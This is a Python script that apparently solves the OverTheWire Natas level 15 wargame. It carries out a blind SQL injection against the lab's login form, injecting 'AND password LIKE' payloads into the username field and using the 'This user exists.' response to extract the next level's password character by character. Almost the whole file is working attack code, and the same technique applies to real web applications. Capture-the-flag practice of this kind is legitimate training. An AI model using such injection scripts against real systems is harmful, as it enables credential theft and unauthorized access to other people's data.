#!/bin/env python3

import os
import requests as rq

import signal
import sys

try:
    natas15pass = os.environ['natas15pass']
except:
    print('run source hackall.sh')
    exit(1)

def mkReqWithPayload(pl):
    return rq.post(
        url = 'http://natas15.natas.labs.overthewire.org/',
        auth = ('natas15', natas15pass),
        params = {
            'debug': '1'
        },
        data = {
            'username': pl
        }
    )

dict = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz '
plTemplate = 'natas16" AND password LIKE "'

passwd = ''
bkp_path = 'natas16/.password'
if os.path.exists(bkp_path):
    bkp = open(bkp_path, 'rb')
    passwd = bkp.read().decode('utf-8')
    bkp.close()

if len(passwd) == 32:
    res = rq.get(
        url = 'http://natas16.natas.labs.overthewire.org/',
        auth = ('natas16', passwd),
    )
    if res.ok:
        print(passwd)
        exit(0)
    else:
        print('natas16 auth failed')
        passwd = ''
        bkp = open(bkp_path, 'wb')
        bkp.write(passwd.encode('ascii'))
        bkp.close()

print('\033[?25l', end = '')

bkp = open(bkp_path, 'wb')

def sigint_handler(sig, frame):
    print('\nSIGINT recieved')
    exit_gracefully()

def exit_gracefully():
    print('\033[?25h', end = '')
    bkp.write(passwd.encode('ascii'))
    bkp.close()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)
      
while len(passwd) < 32:
    for i in dict:
        if i == ' ': raise 'failed'
        pl = plTemplate + passwd + i + '%'
        r = mkReqWithPayload(pl)
        if r.ok: 
            print('\rtried:', passwd + i, end = '')
            if r.text.find('This user exists.') > -1:
                passwd += i
                print('\rhit:  ', passwd)
                break

print('password =', passwd)

exit_gracefully()
